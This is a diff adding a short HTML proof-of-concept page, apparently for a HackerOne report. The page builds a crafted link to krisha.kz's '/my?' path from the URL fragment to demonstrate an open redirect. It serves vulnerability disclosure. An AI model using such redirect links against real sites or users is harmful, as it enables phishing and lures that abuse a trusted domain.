@@ -1,0 +1,18 @@
+<html>
+<head>
+<title>Kolesa Openredirect PoC</title>
+</head>
+<body>
+<h1>PoC for HackerOne</h1>
+<p>To complete the PoC please open a new browser, visit <a href="https://krisha.kz">https://krisha.kz</a> and then open the following URL</p>
+<a href="" id="poc-url"></a>
+<script>
+var hash = location.hash;
+hash = hash.replace('#', '');
+var pocurl = document.getElementById('poc-url');
+var url = "https://krisha.kz/my?" + hash;
+pocurl.href = url;
+pocurl.innerHTML = url;
+</script>
+</body>
+</html>
